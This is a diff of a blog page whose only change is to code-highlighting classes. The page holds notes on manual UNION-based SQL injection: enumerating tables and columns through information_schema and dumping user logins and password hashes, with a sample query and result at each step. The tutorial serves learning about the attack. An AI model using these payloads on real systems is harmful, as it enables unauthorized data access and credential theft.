@@ -64,7 +64,7 @@
         </div>
     </header>
 
-    <h2 id="sql-injection---enumerating-the-databse-using-union">SQL Injection - Enumerating the Databse Using <code class="highlighter-rouge">UNION</code></h2>
+    <h2 id="sql-injection---enumerating-the-databse-using-union">SQL Injection - Enumerating the Databse Using <code class="language-plaintext highlighter-rouge">UNION</code></h2>
 <p><em>Thanks to <a href="https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/">hackingarticles.in</a></em> for the content. These are my notes on the same process.</p>
 
 <h2 id="1-union">1. UNION</h2>
@@ -88,7 +88,7 @@ INSERT INTO `wp_users`(user_login, user_pass, user_email) VALUES ('thehacker4cha
 INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F8897062B9BC13AAB06");
 </code></pre>
 
-<p>To obtain data from the <code class="highlighter-rouge">important_hashes</code> table by appending SQL instructions to a <code class="highlighter-rouge">SELECT</code> statement on the <code class="highlighter-rouge">wp_users</code> table, append the UNION keyword followed by the information to be returned. Keep in mind that in order for the SQLi payload to be executed, the <code class="highlighter-rouge">SELECT</code> on the right side of a <code class="highlighter-rouge">UNION</code> statement must return the same numbers of columns and rows as the <code class="highlighter-rouge">SELECT</code> on the left side. For the above schema, the following will return a valid result:</p>
+<p>To obtain data from the <code class="language-plaintext highlighter-rouge">important_hashes</code> table by appending SQL instructions to a <code class="language-plaintext highlighter-rouge">SELECT</code> statement on the <code class="language-plaintext highlighter-rouge">wp_users</code> table, append the UNION keyword followed by the information to be returned. Keep in mind that in order for the SQLi payload to be executed, the <code class="language-plaintext highlighter-rouge">SELECT</code> on the right side of a <code class="language-plaintext highlighter-rouge">UNION</code> statement must return the same numbers of columns and rows as the <code class="language-plaintext highlighter-rouge">SELECT</code> on the left side. For the above schema, the following will return a valid result:</p>
 
 <h3 id="1-union-returning-arbitary-data">1. UNION returning arbitary data</h3>
 <p><br />
@@ -98,14 +98,14 @@ INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F88
 
 <p><em>Result</em></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID  | user_login | user_pass | user_email |
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID  | user_login | user_pass | user_email |
 | --- | ---------- | --------- | ---------- |
 | 1   | 2          | 3         | 4          |
 </code></pre></div></div>
 <p>Lets break that down.</p>
 
 <ul>
-  <li>In a normal situation, an id of <code class="highlighter-rouge">-1</code> would not return anything. It is used here to silence the output from the left-positioned <code class="highlighter-rouge">SELECT</code> statement.</li>
+  <li>In a normal situation, an id of <code class="language-plaintext highlighter-rouge">-1</code> would not return anything. It is used here to silence the output from the left-positioned <code class="language-plaintext highlighter-rouge">SELECT</code> statement.</li>
   <li>Because the schema for the left side has four columns (ID, user_login, user_pass, and user_email), the right hand select needs to specify four columns. As an attacker, we won’t know how many columns the left hand side has, however. To find how many, simply keep adding values to the right select columns until the payload works.</li>
   <li>Even then, digits by themselves only show how many columns are in the left side’s table. Replace the digits with other things to get more interesting results:</li>
 </ul>
@@ -117,11 +117,11 @@ INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F88
 </code></pre>
 
 <p><em>Result</em></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID  | user_login                       | user_pass | user_email |
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID  | user_login                       | user_pass | user_email |
 | --- | -------------------------------- | --------- | ---------- |
 | md5 | 4E46779A9B6C2F8897062B9BC13AAB06 | 3         | 4          |
 </code></pre></div></div>
-<p>note that the heading here shows columns from the left side <code class="highlighter-rouge">SELECT</code> statement, not the right.</p>
+<p>note that the heading here shows columns from the left side <code class="language-plaintext highlighter-rouge">SELECT</code> statement, not the right.</p>
 
 <p>The digits used to match the column count between the two sides can also be replaced with information functions. These are built into the database system.</p>
 <h3 id="select-returning-data-from-the-database">SELECT returning data from the database</h3>
@@ -130,22 +130,22 @@ INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F88
 
 <p>See appendix [1] for a more complete list of these functions.</p>
 
-<h2 id="3-identifying-data-to-return-in-union-select">3. Identifying data to return in <code class="highlighter-rouge">UNION SELECT</code></h2>
+<h2 id="3-identifying-data-to-return-in-union-select">3. Identifying data to return in <code class="language-plaintext highlighter-rouge">UNION SELECT</code></h2>
 
-<p>Perhaps you want data from other tables in the databse, or you want to learn more about the structure of the database. You can do so by telling select to return data from the <code class="highlighter-rouge">information_schema</code> <a href="2">2</a>, specifically its <code class="highlighter-rouge">TABLES</code> table <a href="3">3</a>. This tables columns looks like:</p>
+<p>Perhaps you want data from other tables in the databse, or you want to learn more about the structure of the database. You can do so by telling select to return data from the <code class="language-plaintext highlighter-rouge">information_schema</code> <a href="2">2</a>, specifically its <code class="language-plaintext highlighter-rouge">TABLES</code> table <a href="3">3</a>. This tables columns looks like:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | ... |
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | ... |
 | ------------- | ------------ | ---------- | --- |
 </code></pre></div></div>
 
-<p>The most immediatley useful of these is the <code class="highlighter-rouge">TABLE_NAME</code> column. We can use this to return a list of the databases tables:</p>
+<p>The most immediatley useful of these is the <code class="language-plaintext highlighter-rouge">TABLE_NAME</code> column. We can use this to return a list of the databases tables:</p>
 
 <p><em>Query</em></p>
 <pre><code class="language-SQL">select * from wp_users where id = -1 union select table_name,2,3,4 from information_schema.tables where table_schema = database()
 </code></pre>
 <p>*Result</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID               | user_login | user_pass | user_email |
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID               | user_login | user_pass | user_email |
 | ---------------- | ---------- | --------- | ---------- |
 | important_hashes | 2          | 3         | 4          |
 | wp_users         | 2          | 3         | 4          |
@@ -154,43 +154,43 @@ INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F88
 <p>Lets break this down.</p>
 
 <ul>
-  <li>select the <code class="highlighter-rouge">TABLE_NAME</code> column,</li>
+  <li>select the <code class="language-plaintext highlighter-rouge">TABLE_NAME</code> column,</li>
   <li>along with the digits 2,3,4</li>
-  <li>from the <code class="highlighter-rouge">information_schema</code> table</li>
-  <li>where the <code class="highlighter-rouge">table_schema</code> column is the current databse.</li>
+  <li>from the <code class="language-plaintext highlighter-rouge">information_schema</code> table</li>
+  <li>where the <code class="language-plaintext highlighter-rouge">table_schema</code> column is the current databse.</li>
 </ul>
 
-<p>This is all useful only if you can see the result. Sometimes the webpage will only show one result from the SQL query. An example of this would be a situation where we only see the <code class="highlighter-rouge">important_hashes</code> table on the webpage after the above query is run. To learn what the other tables are, simply append the <code class="highlighter-rouge">LIMIT</code> keyword to the query:</p>
+<p>This is all useful only if you can see the result. Sometimes the webpage will only show one result from the SQL query. An example of this would be a situation where we only see the <code class="language-plaintext highlighter-rouge">important_hashes</code> table on the webpage after the above query is run. To learn what the other tables are, simply append the <code class="language-plaintext highlighter-rouge">LIMIT</code> keyword to the query:</p>
 
 <p><em>Query</em></p>
 <pre><code class="language-SQL">select * from wp_users where id = -1 union select table_name,2,3,4 from information_schema.tables where table_schema = database() limit 0,1
 </code></pre>
-<p>The result would be the first table listed in the <code class="highlighter-rouge">information_schema</code> tables table. <code class="highlighter-rouge">0,1</code> returns the <code class="highlighter-rouge">0th</code> table and only <code class="highlighter-rouge">1</code> table. To see the next table, increment the 0 (e.g. <code class="highlighter-rouge">1,1</code>).</p>
+<p>The result would be the first table listed in the <code class="language-plaintext highlighter-rouge">information_schema</code> tables table. <code class="language-plaintext highlighter-rouge">0,1</code> returns the <code class="language-plaintext highlighter-rouge">0th</code> table and only <code class="language-plaintext highlighter-rouge">1</code> table. To see the next table, increment the 0 (e.g. <code class="language-plaintext highlighter-rouge">1,1</code>).</p>
 
 <p>Repeat this until no new tables are shown to identify all of the databses tables.</p>
 
-<p>A faster approach to this is to instead use the built-in <code class="highlighter-rouge">group_concat()</code> function on the <code class="highlighter-rouge">SELECT</code>.</p>
+<p>A faster approach to this is to instead use the built-in <code class="language-plaintext highlighter-rouge">group_concat()</code> function on the <code class="language-plaintext highlighter-rouge">SELECT</code>.</p>
 
 <p><em>Query</em></p>
 <pre><code class="language-SQL">select * from wp_users where id = -1 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database()
 </code></pre>
 
 <p><em>Result</em></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID                        | user_login | user_pass | user_email |
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID                        | user_login | user_pass | user_email |
 | ------------------------- | ---------- | --------- | ---------- |
 | important_hashes,wp_users | 2          | 3         | 4          |
 </code></pre></div></div>
 
 <h2 id="4-obtaining-the-column-names-in-a-table">4. Obtaining the column names in a table</h2>
 
-<p>In 3. we saw how to obtain the tables in a databse. Once you’ve found a target table, to get its columns, use the <code class="highlighter-rouge">information_schema.columns</code> table on the target:</p>
+<p>In 3. we saw how to obtain the tables in a databse. Once you’ve found a target table, to get its columns, use the <code class="language-plaintext highlighter-rouge">information_schema.columns</code> table on the target:</p>
 
 <p><em>Query</em></p>
 <pre><code class="language-SQL">select * from wp_users where id = -1 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='wp_users'
 </code></pre>
 
 <p><em>Result</em></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID                                 | user_login | user_pass | user_email |
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID                                 | user_login | user_pass | user_email |
 | ---------------------------------- | ---------- | --------- | ---------- |
 | ID,user_login,user_pass,user_email | 2          | 3         | 4          |
 </code></pre></div></div>
@@ -204,7 +204,7 @@ INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F88
 </code></pre>
 
 <p><em>Result</em></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID  | user_login     | user_pass                        | user_email             |
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| ID  | user_login     | user_pass                        | user_email             |
 | --- | -------------- | -------------------------------- | ---------------------- |
 | 1   | thehacker4chan | 4E46779A9B6C2F8897062B9BC13AAB06 | zip.squibbles@vghs.edu |
 </code></pre></div></div>
@@ -212,7 +212,7 @@ INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F88
 <h1 id="appendix">Appendix</h1>
 
 <p>[1] <a href="https://www.w3resource.com/mysql/mysql-information-functions.php">MySQL Information Functions</a></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MySQL BENCHMARK() 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MySQL BENCHMARK() 
 MySQL CHARSET() 
 MySQL COERCIBILITY() 
 MySQL COLLATION() 
